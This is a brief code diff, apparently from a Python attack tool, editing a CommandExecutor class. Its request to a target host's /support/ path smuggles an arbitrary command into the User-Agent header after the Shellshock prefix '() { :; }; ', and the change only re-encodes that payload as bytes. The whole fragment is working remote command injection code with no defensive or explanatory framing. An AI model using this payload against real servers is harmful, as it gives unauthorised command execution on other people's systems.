@@ -28,7 +28,7 @@ class CommandExecutor:
         response = requests.get(
             url=f"http://{ip}/support/",
             headers={
-                "User-Agent": "() { :; }; " + command
+                "User-Agent": b"() { :; }; " + command.encode()
             }
         )
 
